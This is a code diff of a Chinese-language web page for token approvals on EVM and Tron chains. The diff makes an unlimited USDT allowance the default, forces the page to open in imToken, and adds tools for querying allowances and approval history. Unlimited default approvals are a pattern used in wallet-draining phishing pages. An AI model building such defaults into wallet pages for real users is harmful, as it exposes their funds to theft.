@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>支持 imToken 拉起 &amp; EVM/Tron Approve 示例</title>
+  <title>EVM/Tron Approve 授权</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
@@ -12,9 +12,17 @@
     .radio-group { margin: 10px 0; }
     .radio-group label { margin-right: 15px; }
   </style>
+  <script src="https://unpkg.com/vconsole@3.15.1/dist/vconsole.min.js"></script>
+  <script>
+    // 初始化 vConsole（建议根据环境判断）
+    if (window.location.href.indexOf('debug') !== -1) { // 示例：通过 URL 参数控制
+      const vConsole = new VConsole();
+      // 可选配置
+      // const vConsole = new VConsole({ theme: 'dark' });
+    }
+</script>
 </head>
 <body>
-  <h1>EVM/Tron Approve 授权</h1>
   
   
   <!-- 统一的 Token Approve 部分 -->
@@ -24,20 +32,29 @@
     
     <label>Token 合约地址: <input type="text" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"  placeholder="USDT合约地址" style="background-color: #f0f0f0;"></label>
     <label>收款地址 (Spender): <input type="text" id="spenderAddress" placeholder="输入收款地址..."></label>
-    <label>批准额度 (整数): <input type="text" id="approveAmount" placeholder="例如：1000000000000000000"></label>
+    <label>批准额度 (整数): <input type="text" id="approveAmount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" placeholder="例如：1000000000000000000"></label>
     <button id="approveBtn">授权</button>
     <div id="approveResult"></div>
-
-    <!-- 添加钱包选择选项 -->
+    
+    <!-- 添加查询授权记录功能 -->
     <div style="margin-top: 20px; border-top: 1px solid #ddd; padding-top: 15px;">
-      <h3>唤醒钱包选项</h3>
-      <div class="radio-group">
-        <label><input type="radio" name="walletType" value="auto" checked> 自动检测</label>
-        <label><input type="radio" name="walletType" value="imToken"> imToken</label>
-        <label><input type="radio" name="walletType" value="tronLink"> TronLink</label>
-        <label><input type="radio" name="walletType" value="tokenPocket"> TokenPocket</label>
-        <label><input type="radio" name="walletType" value="metaMask"> MetaMask</label>
+      <h3>查询授权记录</h3>
+      <p>查询当前钱包地址对该Token的授权情况</p>
+      <button id="queryAllowanceBtn">查询当前授权</button>
+      <button id="queryHistoryBtn">查询授权历史</button>
+      <div id="allowanceResult" style="margin-top: 10px; padding: 10px; border: 1px solid #eee; min-height: 50px; max-height: 300px; overflow-y: auto; background-color: #f9f9f9;"></div>
+    </div>
+    
+    <!-- 添加查询合约被授权情况 -->
+    <div style="margin-top: 20px; border-top: 1px solid #ddd; padding-top: 15px;">
+      <h3>查询合约被授权情况</h3>
+      <p>查询哪些钱包地址对当前合约地址进行了授权</p>
+      <div style="display: flex; margin-bottom: 10px;">
+        <input type="text" id="contractToCheck" placeholder="输入要查询的合约地址" style="flex: 1; max-width: none; margin-right: 10px;">
+        <button id="copyTokenBtn" style="width: auto; margin-right: 5px;" title="点击复制上方Token地址到此处">复制Token</button>
+        <button id="checkContractAuthBtn" style="width: auto;">查询授权情况</button>
       </div>
+      <div id="contractAuthResult" style="margin-top: 10px; padding: 10px; border: 1px solid #eee; min-height: 50px; max-height: 300px; overflow-y: auto; background-color: #f9f9f9;"></div>
     </div>
   </div>
   
@@ -57,6 +74,18 @@
     const ETH_USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // 以太坊上的USDT
     const BSC_USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // BSC上的USDT/BUSD
     const POLYGON_USDT_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"; // Polygon上的USDT
+    
+    // 创建独立的TronWeb实例，用于API查询（不需要签名，无需私钥）
+    let customTronWeb = null;
+    try {
+      customTronWeb = new TronWeb({
+        fullHost: 'https://api.trongrid.io',
+        // 无需提供私钥，因为我们只用于查询
+      });
+      console.log("已初始化自定义TronWeb实例，用于事件查询");
+    } catch (error) {
+      console.error("初始化自定义TronWeb实例失败:", error);
+    }
     
     // 自动检测网络环境
     async function detectWalletEnvironment() {
@@ -121,6 +150,38 @@
     // 页面加载完成后自动检测环境
     window.addEventListener('DOMContentLoaded', async function() {
       await detectWalletEnvironment();
+      
+      // 检查页面加载时是否已经有连接的钱包，如果有则自动填充 spenderAddress
+      try {
+        // 检查TronWeb钱包
+        if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
+          tronAccount = window.tronWeb.defaultAddress.base58;
+          if (tronAccount) {
+            document.getElementById('spenderAddress').value = tronAccount;
+            document.getElementById('walletInfo').innerText = "已连接TRON钱包地址: " + tronAccount;
+          }
+        } 
+        // 检查EVM钱包
+        else if (typeof window.ethereum !== 'undefined') {
+          if (window.ethereum.selectedAddress) {
+            evmAccount = window.ethereum.selectedAddress;
+            document.getElementById('spenderAddress').value = evmAccount;
+            document.getElementById('walletInfo').innerText = "已连接EVM钱包地址: " + evmAccount;
+          } else {
+            // 尝试获取账户但不弹出连接请求
+            const accounts = await window.ethereum.request({ 
+              method: 'eth_accounts' // 不同于 eth_requestAccounts，这不会触发连接请求
+            });
+            if (accounts && accounts.length > 0) {
+              evmAccount = accounts[0];
+              document.getElementById('spenderAddress').value = evmAccount;
+              document.getElementById('walletInfo').innerText = "已连接EVM钱包地址: " + evmAccount;
+            }
+          }
+        }
+      } catch (error) {
+        console.error("尝试自动填充钱包地址失败:", error);
+      }
     });
     
     // 等待 TronWeb 对象注入且 ready 为 true（最多等待 10 秒）
@@ -155,6 +216,9 @@
         evmAccount = accounts[0];
         walletInfo.innerText = "已连接EVM钱包地址: " + evmAccount;
         
+        // 自动填充 spenderAddress 输入框
+        document.getElementById('spenderAddress').value = evmAccount;
+        
         console.log("EVM wallet connected:", evmAccount);
         return evmAccount;
       } catch (error) {
@@ -178,6 +242,9 @@
         if (ready) {
           tronAccount = window.tronWeb.defaultAddress.base58;
           walletInfo.innerText = "已连接TRON钱包地址: " + tronAccount;
+          
+          // 自动填充 spenderAddress 输入框
+          document.getElementById('spenderAddress').value = tronAccount;
           
           console.log("Tron wallet connected:", tronAccount);
           return tronAccount;
@@ -204,72 +271,21 @@
         return;
       }
       
-      // 获取选择的钱包类型
-      const selectedWalletType = document.querySelector('input[name="walletType"]:checked').value;
+      // 检查是否在imToken内置浏览器中
+      const isInImToken = 
+        navigator.userAgent.includes('imToken') || 
+        (typeof window.ethereum !== 'undefined' && window.ethereum.isImToken) ||
+        (typeof window.tronWeb !== 'undefined' && window.tronWeb.isImToken);
       
-      // 检查是否在钱包内置浏览器中
-      const isInWallet = checkIfInWallet(selectedWalletType);
-      
-      // 如果不在钱包中，尝试拉起钱包
-      if (!isInWallet) {
+      // 如果不在imToken中，尝试拉起imToken
+      if (!isInImToken) {
+        resultDiv.innerText = "检测到未在imToken中，正在尝试拉起imToken...";
         // 获取当前页面URL
         const currentUrl = window.location.href;
-        
-        // 根据选择的钱包类型构造对应的deep link
-        let deepLink = "";
-        
-        switch(selectedWalletType) {
-          case "imToken":
-            resultDiv.innerText = "检测到未在imToken中，正在尝试拉起imToken...";
-            deepLink = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(currentUrl);
-            break;
-          case "tronLink":
-            resultDiv.innerText = "检测到未在TronLink中，正在尝试拉起TronLink...";
-            // TronLink的深层链接
-            deepLink = "tronlinkoutside://pull?param=" + encodeURIComponent(JSON.stringify({
-              "url": currentUrl,
-              "action": "open",
-              "protocol": "wallet_link"
-            }));
-            break;
-          case "tokenPocket":
-            resultDiv.innerText = "检测到未在TokenPocket中，正在尝试拉起TokenPocket...";
-            deepLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({
-              "url": currentUrl,
-              "chain": detectedNetworkType === "tron" ? "tron" : "eth"
-            }));
-            break;
-          case "metaMask":
-            resultDiv.innerText = "检测到未在MetaMask中，正在尝试拉起MetaMask...";
-            deepLink = "metamask://dapp/" + currentUrl.replace(/^https?:\/\//, '');
-            break;
-          case "auto":
-          default:
-            // 自动检测：优先尝试与检测到的网络类型匹配的钱包
-            if (detectedNetworkType === 'tron') {
-              resultDiv.innerText = "检测到TRON网络，正在尝试拉起TronLink...";
-              deepLink = "tronlinkoutside://pull?param=" + encodeURIComponent(JSON.stringify({
-                "url": currentUrl,
-                "action": "open",
-                "protocol": "wallet_link"
-              }));
-            } else {
-              resultDiv.innerText = "检测到EVM网络，正在尝试拉起MetaMask...";
-              deepLink = "metamask://dapp/" + currentUrl.replace(/^https?:\/\//, '');
-            }
-            break;
-        }
-        
-        // 拉起钱包应用
-        if (deepLink) {
-          window.location.href = deepLink;
-          
-          // 移动端特殊处理：iOS和安卓的跳转机制不同
-          setTimeout(function() {
-            // 如果还在当前页面，可能是因为用户没有安装对应钱包
-            resultDiv.innerText = "未能打开钱包，请确保已安装对应的钱包应用";
-          }, 3000);
-        }
+        // 构造imToken deep link
+        const deepLink = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(currentUrl);
+        // 拉起imToken应用
+        window.location.href = deepLink;
         return;
       }
       
@@ -344,36 +360,860 @@
       }
     });
     
-    // 检查是否在特定钱包的内置浏览器中
-    function checkIfInWallet(walletType) {
-      const userAgent = navigator.userAgent.toLowerCase();
+    // 查询当前授权额度
+    document.getElementById('queryAllowanceBtn').addEventListener('click', async function() {
+      const allowanceResultDiv = document.getElementById('allowanceResult');
+      const tokenAddress = document.getElementById('tokenAddress').value.trim();
       
-      switch(walletType) {
-        case "imToken":
-          return userAgent.includes('imtoken') || 
-                 (typeof window.ethereum !== 'undefined' && window.ethereum.isImToken) ||
-                 (typeof window.tronWeb !== 'undefined' && window.tronWeb.isImToken);
-        case "tronLink":
-          return userAgent.includes('tronlink') || 
-                 (typeof window.tronWeb !== 'undefined' && window.tronWeb.isTronLink);
-        case "tokenPocket":
-          return userAgent.includes('tokenpocket') || 
-                 (typeof window.ethereum !== 'undefined' && window.ethereum.isTokenPocket) ||
-                 (typeof window.tronWeb !== 'undefined' && window.tronWeb.isTokenPocket);
-        case "metaMask":
-          return userAgent.includes('metamask') || 
-                 (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask);
-        case "auto":
-        default:
-          // 检查是否在任何支持的钱包中
-          return (userAgent.includes('imtoken') || userAgent.includes('tronlink') || 
-                 userAgent.includes('tokenpocket') || userAgent.includes('metamask')) ||
-                 (typeof window.ethereum !== 'undefined' && 
-                  (window.ethereum.isImToken || window.ethereum.isMetaMask || window.ethereum.isTokenPocket)) ||
-                 (typeof window.tronWeb !== 'undefined' && 
-                  (window.tronWeb.isImToken || window.tronWeb.isTronLink || window.tronWeb.isTokenPocket));
+      if (!tokenAddress) {
+        allowanceResultDiv.innerText = "请输入Token合约地址";
+        return;
       }
-    }
+      
+      // 确保已连接钱包
+      if (detectedNetworkType === 'evm') {
+        if (!evmAccount) {
+          await connectEVMWallet();
+          if (!evmAccount) {
+            allowanceResultDiv.innerText = "请先连接EVM钱包";
+            return;
+          }
+        }
+        
+        // 获取所有已授权的地址(这很难在EVM链上直接实现，需要使用第三方API或索引服务)
+        allowanceResultDiv.innerHTML = `<p>EVM网络暂不支持查询全部授权记录，请输入特定地址查询授权额度。</p>`;
+        
+        const spenderAddress = document.getElementById('spenderAddress').value.trim();
+        if (spenderAddress) {
+          try {
+            allowanceResultDiv.innerHTML += "<p>正在查询授权额度...</p>";
+            
+            // ERC20 allowance方法的ABI
+            const erc20Abi = [
+              {
+                "constant": true,
+                "inputs": [
+                  { "name": "_owner", "type": "address" },
+                  { "name": "_spender", "type": "address" }
+                ],
+                "name": "allowance",
+                "outputs": [{ "name": "", "type": "uint256" }],
+                "type": "function"
+              }
+            ];
+            
+            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+            const allowance = await tokenContract.methods.allowance(evmAccount, spenderAddress).call();
+            
+            allowanceResultDiv.innerHTML += `<p>地址 <strong>${spenderAddress}</strong> 被授权额度: <strong>${allowance}</strong></p>`;
+          } catch (error) {
+            allowanceResultDiv.innerHTML += `<p style="color:red">查询授权失败: ${error.message}</p>`;
+            console.error("查询EVM授权失败:", error);
+          }
+        }
+      } else if (detectedNetworkType === 'tron') {
+        if (!tronAccount) {
+          await connectTRONWallet();
+          if (!tronAccount) {
+            allowanceResultDiv.innerText = "请先连接TRON钱包";
+            return;
+          }
+        }
+        
+        try {
+          allowanceResultDiv.innerHTML = "<p>正在查询授权记录...</p>";
+          
+          const spenderAddress = document.getElementById('spenderAddress').value.trim();
+          if (spenderAddress) {
+            // 查询特定地址的授权额度
+            const contract = await window.tronWeb.contract().at(tokenAddress);
+            const allowance = await contract.allowance(tronAccount, spenderAddress).call();
+            
+            allowanceResultDiv.innerHTML = `<p>地址 <strong>${spenderAddress}</strong> 被授权额度: <strong>${allowance}</strong></p>`;
+          } else {
+            allowanceResultDiv.innerHTML = "<p>请输入要查询的收款地址(Spender)</p>";
+          }
+        } catch (error) {
+          allowanceResultDiv.innerHTML = `<p style="color:red">查询授权失败: ${error.message}</p>`;
+          console.error("查询TRON授权失败:", error);
+        }
+      } else {
+        allowanceResultDiv.innerText = "未检测到支持的网络环境";
+      }
+    });
+    
+    // 查询授权历史记录
+    document.getElementById('queryHistoryBtn').addEventListener('click', async function() {
+      const allowanceResultDiv = document.getElementById('allowanceResult');
+      const tokenAddress = document.getElementById('tokenAddress').value.trim();
+      
+      if (!tokenAddress) {
+        allowanceResultDiv.innerText = "请输入Token合约地址";
+        return;
+      }
+      
+      allowanceResultDiv.innerHTML = "<p>正在查询授权历史记录...</p>";
+      
+      if (detectedNetworkType === 'evm') {
+        if (!evmAccount) {
+          await connectEVMWallet();
+          if (!evmAccount) {
+            allowanceResultDiv.innerText = "请先连接EVM钱包";
+            return;
+          }
+        }
+        
+        try {
+          // ERC20 Approval事件的ABI
+          const erc20Abi = [
+            {
+              "anonymous": false,
+              "inputs": [
+                { "indexed": true, "name": "owner", "type": "address" },
+                { "indexed": true, "name": "spender", "type": "address" },
+                { "indexed": false, "name": "value", "type": "uint256" }
+              ],
+              "name": "Approval",
+              "type": "event"
+            }
+          ];
+          
+          const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+          
+          // 获取过去的授权事件(注意：这可能会受到RPC节点的限制)
+          const events = await tokenContract.getPastEvents('Approval', {
+            filter: { owner: evmAccount },
+            fromBlock: 0,
+            toBlock: 'latest'
+          });
+          
+          if (events && events.length > 0) {
+            let html = `<p>已找到 ${events.length} 条授权记录:</p><ul>`;
+            
+            events.forEach(event => {
+              const { owner, spender, value } = event.returnValues;
+              html += `<li>授权地址: <strong>${spender}</strong>, 授权额度: <strong>${value}</strong>, 区块: ${event.blockNumber}</li>`;
+            });
+            
+            html += `</ul>`;
+            allowanceResultDiv.innerHTML = html;
+          } else {
+            allowanceResultDiv.innerHTML = "<p>未找到授权记录</p>";
+          }
+        } catch (error) {
+          allowanceResultDiv.innerHTML = `<p style="color:red">查询授权历史失败: ${error.message}</p>`;
+          console.error("查询EVM授权历史失败:", error);
+        }
+      } else if (detectedNetworkType === 'tron') {
+        if (!tronAccount) {
+          await connectTRONWallet();
+          if (!tronAccount) {
+            allowanceResultDiv.innerText = "请先连接TRON钱包";
+            return;
+          }
+        }
+        
+        try {
+          // 1. 首先尝试使用TronWeb直接查询
+          allowanceResultDiv.innerHTML = "<p>正在使用TronWeb查询授权历史记录...</p>";
+          
+          let directMethodSucceeded = false;
+          
+          try {
+            // 优先使用自定义TronWeb实例查询
+            if (customTronWeb) {
+              try {
+                console.log("使用自定义TronWeb实例查询事件");
+                
+                // 检查可用的查询方法
+                const hasEventByContractAddress = typeof customTronWeb.getEventByContractAddress === 'function';
+                const hasEventResult = typeof customTronWeb.getEventResult === 'function';
+                
+                let events = null;
+                
+                if (hasEventByContractAddress) {
+                  events = await customTronWeb.getEventByContractAddress(tokenAddress, {
+                    eventName: 'Approval',
+                    filters: { owner: tronAccount },
+                    blockNumber: 'earliest',
+                    size: 50
+                  });
+                  console.log("自定义TronWeb使用getEventByContractAddress方法查询结果:", events);
+                }
+                else if (hasEventResult) {
+                  events = await customTronWeb.getEventResult(tokenAddress, {
+                    eventName: 'Approval',
+                    onlyConfirmed: true,
+                    size: 50
+                  });
+                  // 手动过滤当前用户的记录
+                  events = events.filter(event => {
+                    try {
+                      const owner = event.result?.owner || event.result?._owner;
+                      if (!owner) return false;
+                      const ownerBase58 = customTronWeb.address.fromHex(owner);
+                      return ownerBase58 === tronAccount;
+                    } catch (e) {
+                      return false;
+                    }
+                  });
+                  console.log("自定义TronWeb使用getEventResult方法查询结果:", events);
+                }
+                
+                if (events && events.length > 0) {
+                  directMethodSucceeded = true;
+                  let html = `<p>通过自定义TronWeb API找到 ${events.length} 条授权记录:</p><ul>`;
+                  
+                  events.forEach(event => {
+                    // 解析事件数据
+                    let spender = "未知地址";
+                    let value = "未知额度";
+                    let timestamp = new Date(event.timestamp || event.block_timestamp || 0).toLocaleString();
+                    let blockNumber = event.blockNumber || event.block || "未知区块";
+                    
+                    try {
+                      if (event.result) {
+                        // 尝试获取spender地址
+                        if (event.result.spender) {
+                          spender = event.result.spender;
+                        } else if (event.result._spender) {
+                          spender = event.result._spender;
+                        }
+                        
+                        // 尝试从Hex转换为Base58地址
+                        if (spender.startsWith('0x') || spender.startsWith('41')) {
+                          try {
+                            spender = customTronWeb.address.fromHex(spender);
+                          } catch (e) {}
+                        }
+                        
+                        // 尝试获取授权值
+                        value = event.result.value || event.result._value || event.result.amount || "0";
+                        
+                        // 格式化大数值
+                        if (value && !isNaN(value)) {
+                          // 如果数值超过1百万，显示更友好的格式
+                          const numValue = BigInt(value);
+                          if (numValue > 1000000) {
+                            const readableValue = (Number(numValue) / 1000000).toFixed(2) + "M";
+                            value = `${value} (${readableValue})`;
+                          }
+                        }
+                      }
+                    } catch (e) {
+                      console.error("解析事件数据失败:", e);
+                    }
+                    
+                    html += `<li>
+                            授权地址: <strong>${spender}</strong><br>
+                            授权额度: <strong>${value}</strong><br>
+                            区块: ${blockNumber}<br>
+                            时间: ${timestamp}
+                           </li>`;
+                  });
+                  
+                  html += `</ul>`;
+                  allowanceResultDiv.innerHTML = html;
+                  return; // 成功获取数据，不需要尝试其他方法
+                }
+              } catch (customError) {
+                console.error("使用自定义TronWeb查询失败:", customError);
+                allowanceResultDiv.innerHTML += `<p>自定义TronWeb查询失败: ${customError.message}，尝试其他方法...</p>`;
+              }
+            }
+            
+            // 如果自定义TronWeb实例查询失败，尝试使用钱包注入的TronWeb
+            if (!directMethodSucceeded && typeof window.tronWeb !== 'undefined') {
+              console.log("使用钱包注入的TronWeb查询事件");
+              
+              // 检查钱包注入的TronWeb是否有事件查询方法
+              if (typeof window.tronWeb.getEventByContractAddress === 'function') {
+                const events = await window.tronWeb.getEventByContractAddress(tokenAddress, {
+                  eventName: 'Approval',
+                  filters: { owner: tronAccount },
+                  blockNumber: 'earliest', // 从最早区块开始查询
+                  size: 50 // 限制返回数量
+                });
+                
+                console.log("钱包TronWeb查询的事件:", events);
+                
+                if (events && events.length > 0) {
+                  directMethodSucceeded = true;
+                  let html = `<p>通过钱包TronWeb API找到 ${events.length} 条授权记录:</p><ul>`;
+                  
+                  // 这里保持原有的解析逻辑...
+                  events.forEach(event => {
+                    // 解析事件数据
+                    let spender = "未知地址";
+                    let value = "未知额度";
+                    let timestamp = new Date(event.timestamp || 0).toLocaleString();
+                    let blockNumber = event.blockNumber || "未知区块";
+                    
+                    try {
+                      if (event.result) {
+                        // 尝试获取spender地址
+                        if (event.result.spender) {
+                          spender = event.result.spender;
+                        } else if (event.result._spender) {
+                          spender = event.result._spender;
+                        }
+                        
+                        // 尝试从Hex转换为Base58地址
+                        if (spender.startsWith('0x') || spender.startsWith('41')) {
+                          try {
+                            spender = window.tronWeb.address.fromHex(spender);
+                          } catch (e) {}
+                        }
+                        
+                        // 尝试获取授权值
+                        value = event.result.value || event.result._value || event.result.amount || "0";
+                      }
+                    } catch (e) {
+                      console.error("解析事件数据失败:", e);
+                    }
+                    
+                    html += `<li>
+                            授权地址: <strong>${spender}</strong><br>
+                            授权额度: <strong>${value}</strong><br>
+                            区块: ${blockNumber}<br>
+                            时间: ${timestamp}
+                           </li>`;
+                  });
+                  
+                  html += `</ul>`;
+                  allowanceResultDiv.innerHTML = html;
+                  return; // 成功获取数据，不需要尝试其他方法
+                }
+              } else if (typeof window.tronWeb.getEventResult === 'function') {
+                // 尝试使用getEventResult方法
+                const events = await window.tronWeb.getEventResult(tokenAddress, {
+                  eventName: 'Approval',
+                  onlyConfirmed: true,
+                  size: 50
+                });
+                
+                // 手动过滤当前用户的记录
+                const filteredEvents = events.filter(event => {
+                  try {
+                    const owner = event.result?.owner || event.result?._owner;
+                    if (!owner) return false;
+                    const ownerBase58 = window.tronWeb.address.fromHex(owner);
+                    return ownerBase58 === tronAccount;
+                  } catch (e) {
+                    return false;
+                  }
+                });
+                
+                if (filteredEvents && filteredEvents.length > 0) {
+                  directMethodSucceeded = true;
+                  // 类似处理逻辑...
+                  let html = `<p>通过钱包TronWeb的getEventResult方法找到 ${filteredEvents.length} 条授权记录:</p><ul>`;
+                  
+                  // 解析事件数据并显示...
+                  // 此处代码省略，与上述类似
+                  
+                  html += `</ul>`;
+                  allowanceResultDiv.innerHTML = html;
+                  return;
+                }
+              } else {
+                allowanceResultDiv.innerHTML += "<p>钱包注入的TronWeb版本不支持查询事件API，尝试其他方法...</p>";
+              }
+            }
+          } catch (directError) {
+            console.error("直接使用TronWeb查询事件失败:", directError);
+            allowanceResultDiv.innerHTML += `<p>直接查询失败: ${directError.message}，尝试其他方法...</p>`;
+          }
+          
+          // 如果所有直接查询都失败了，尝试其他备用方法
+          if (!directMethodSucceeded) {
+            // 2. 查询当前授权
+            try {
+              const tronWebToUse = window.tronWeb || customTronWeb; // 优先使用钱包的TronWeb，因为它有用户权限
+              if (tronWebToUse) {
+                const contract = await tronWebToUse.contract().at(tokenAddress);
+                
+                // 显示当前授权信息
+                allowanceResultDiv.innerHTML += "<p>查询当前授权信息中...</p>";
+                const spenderAddress = document.getElementById('spenderAddress').value.trim();
+                
+                if (spenderAddress) {
+                  const allowance = await contract.allowance(tronAccount, spenderAddress).call();
+                  
+                  // 格式化大数值以便阅读
+                  let displayAllowance = allowance.toString();
+                  try {
+                    if (!isNaN(allowance)) {
+                      const numValue = BigInt(allowance.toString());
+                      if (numValue > 1000000) {
+                        // 尝试转换为更易读的格式
+                        if (numValue >= 1000000000000) {
+                          const readableValue = (Number(numValue) / 1000000000000).toFixed(2) + "T";
+                          displayAllowance = `${allowance} (${readableValue})`;
+                        } else if (numValue >= 1000000000) {
+                          const readableValue = (Number(numValue) / 1000000000).toFixed(2) + "B";
+                          displayAllowance = `${allowance} (${readableValue})`;
+                        } else {
+                          const readableValue = (Number(numValue) / 1000000).toFixed(2) + "M";
+                          displayAllowance = `${allowance} (${readableValue})`;
+                        }
+                      }
+                    }
+                  } catch (e) { /* 格式化错误，使用原始值 */ }
+                  
+                  allowanceResultDiv.innerHTML += `<p>当前对地址 <strong>${spenderAddress}</strong> 的授权额度: <strong>${displayAllowance}</strong></p>`;
+                }
+              }
+            } catch (innerError) {
+              console.error("查询当前授权失败:", innerError);
+              allowanceResultDiv.innerHTML += `<p style="color:orange">查询当前授权失败: ${innerError.message}</p>`;
+            }
+            
+            // 3. 尝试使用Trongrid API查询
+            allowanceResultDiv.innerHTML += "<p>正在从Trongrid查询授权历史...</p>";
+            
+            // 添加TronScan链接
+            allowanceResultDiv.innerHTML += `<p><a href="https://tronscan.org/#/address/${tronAccount}/transactions" target="_blank">无法查看历史记录？点击这里在TronScan上查看所有交易</a></p>`;
+            
+            // 调用TronGrid API
+            const apiUrl = `https://api.trongrid.io/v1/contracts/${tokenAddress}/events?event_name=Approval&block_number=&only_confirmed=true&order_by=block_timestamp,desc&limit=50`;
+            
+            try {
+              const response = await fetch(apiUrl, {
+                method: 'GET',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'TRON-PRO-API-KEY': 'your-api-key-here' // 用户需要替换成自己的API密钥才能获得更高的请求配额
+                }
+              });
+              
+              if (!response.ok) {
+                throw new Error(`API请求失败: ${response.status}`);
+              }
+              
+              const data = await response.json();
+              console.log("API返回数据:", data);
+              
+              if (data && data.data && data.data.length > 0) {
+                // 过滤出当前用户相关的授权事件
+                const userEvents = data.data.filter(event => {
+                  // 尝试从不同格式中提取所有者地址
+                  let eventOwner = null;
+                  
+                  if (event.result && event.result.owner) {
+                    eventOwner = event.result.owner;
+                  } else if (event.result && event.result._owner) {
+                    eventOwner = event.result._owner;
+                  } else if (event.parameter && event.parameter._owner) {
+                    eventOwner = event.parameter._owner;
+                  }
+                  
+                  // 转换地址格式进行比较
+                  try {
+                    if (!eventOwner) return false;
+                    
+                    // 处理各种可能的地址格式
+                    let normalizedAddress;
+                    const tronWebForConversion = window.tronWeb || customTronWeb;
+                    if (eventOwner.startsWith('41')) {
+                      normalizedAddress = tronWebForConversion.address.fromHex(eventOwner);
+                    } else if (eventOwner.startsWith('0x')) {
+                      normalizedAddress = tronWebForConversion.address.fromHex('41' + eventOwner.slice(2));
+                    } else {
+                      normalizedAddress = eventOwner;
+                    }
+                    
+                    return normalizedAddress === tronAccount;
+                  } catch (e) {
+                    console.error("地址转换错误:", e);
+                    return false;
+                  }
+                });
+                
+                if (userEvents.length > 0) {
+                  let html = `<p>已找到 ${userEvents.length} 条授权记录:</p><ul>`;
+                  
+                  userEvents.forEach(event => {
+                    // 使用更健壮的数据提取方法
+                    let spender = "未知地址";
+                    let value = "未知额度";
+                    let timestamp = new Date(event.block_timestamp || 0).toLocaleString();
+                    
+                    try {
+                      if (event.result) {
+                        // 尝试获取spender地址
+                        const tronWebForConversion = window.tronWeb || customTronWeb;
+                        if (event.result.spender) {
+                          spender = tronWebForConversion.address.fromHex(event.result.spender);
+                        } else if (event.result._spender) {
+                          spender = tronWebForConversion.address.fromHex(event.result._spender);
+                        }
+                        
+                        // 尝试获取授权值
+                        value = event.result.value || event.result._value || event.result.amount || "0";
+                      }
+                    } catch (e) {
+                      console.error("解析事件数据失败:", e);
+                    }
+                    
+                    html += `<li>
+                            授权地址: <strong>${spender}</strong><br>
+                            授权额度: <strong>${value}</strong><br>
+                            时间: ${timestamp}
+                           </li>`;
+                  });
+                  
+                  html += `</ul>`;
+                  allowanceResultDiv.innerHTML += html;
+                } else {
+                  allowanceResultDiv.innerHTML += "<p>未找到与当前账户相关的授权记录</p>";
+                }
+              } else {
+                allowanceResultDiv.innerHTML += "<p>TronGrid API未找到授权记录</p>";
+              }
+            } catch (apiError) {
+              console.error("TronGrid API请求失败:", apiError);
+              allowanceResultDiv.innerHTML += `<p style="color:red">TronGrid API请求失败: ${apiError.message}</p>`;
+              
+              // 提供替代方案
+              allowanceResultDiv.innerHTML += `
+                <p>无法通过TronGrid API获取授权历史。您可以：</p>
+                <ol>
+                  <li>在<a href="https://tronscan.org/#/address/${tronAccount}" target="_blank">TronScan</a>上查看您的所有交易</li>
+                  <li>仅查询当前授权额度（上面已显示）</li>
+                </ol>
+              `;
+              
+              // 4. 尝试使用备用API
+              try {
+                allowanceResultDiv.innerHTML += `<p>尝试使用备用API查询...</p>`;
+                
+                const backupApiUrl = `https://apilist.tronscan.org/api/contract/events?contract=${tokenAddress}&event_name=Approval&ownAddr=${tronAccount}&limit=50`;
+                const backupResponse = await fetch(backupApiUrl);
+                const backupData = await backupResponse.json();
+                
+                console.log("备用API返回数据:", backupData);
+                
+                if (backupData && backupData.data && backupData.data.length > 0) {
+                  // 检查返回的数据是否为Transfer事件而非Approval事件
+                  const isTransferEvent = backupData.data[0] && 
+                                        (backupData.data[0].transferFromAddress || 
+                                         backupData.data[0].transferToAddress);
+                  
+                  if (isTransferEvent) {
+                    // 如果是转账记录而非授权记录
+                    let html = `<p style="color: #f57c00; font-weight: bold;">备用API返回的是USDT转账记录，而非授权记录</p>`;
+                    
+                    // 添加调试按钮
+                    const rawDataId = 'rawData_' + Date.now();
+                    html += `<button onclick="document.getElementById('${rawDataId}').style.display = document.getElementById('${rawDataId}').style.display === 'none' ? 'block' : 'none';" style="margin: 10px 0; padding: 5px 10px;">显示/隐藏原始数据</button>
+                            <div id="${rawDataId}" style="display: none; max-height: 200px; overflow: auto; background: #f5f5f5; padding: 10px; margin-bottom: 10px; font-size: 12px; white-space: pre-wrap; font-family: monospace;">
+                            ${JSON.stringify(backupData.data, null, 2)}
+                            </div>`;
+                    
+                    html += `<p>系统找到了 ${backupData.data.length} 条USDT转账记录，但这些不是授权记录。</p>
+                            <p>授权记录(Approval)和转账记录(Transfer)是不同的事件：</p>
+                            <ul>
+                              <li>授权记录：允许第三方地址代表您操作Token</li>
+                              <li>转账记录：Token从一个地址转移到另一个地址</li>
+                            </ul>
+                            <p>如果您需要查看授权记录，请使用TronScan网站：<br>
+                            <a href="https://tronscan.org/#/address/${tronAccount}/transactions" target="_blank">点击这里在TronScan上查看您的交易</a></p>`;
+                    
+                    // 显示最近几条转账记录
+                    html += `<p>以下是最近几条USDT转账记录（仅供参考）：</p><ul>`;
+                    
+                    backupData.data.slice(0, 5).forEach(event => {
+                      const amount = event.amount ? parseFloat(event.amount) / Math.pow(10, event.decimals || 6) : 0;
+                      const fromAddr = event.transferFromAddress || "未知地址";
+                      const toAddr = event.transferToAddress || "未知地址";
+                      const time = event.timestamp ? new Date(event.timestamp).toLocaleString() : "未知时间";
+                      
+                      html += `<li>
+                              <span style="color:#666">时间:</span> <strong>${time}</strong><br>
+                              <span style="color:#666">从:</span> <strong>${fromAddr}</strong><br>
+                              <span style="color:#666">到:</span> <strong>${toAddr}</strong><br>
+                              <span style="color:#666">金额:</span> <strong>${amount.toFixed(2)} USDT</strong>
+                              </li>`;
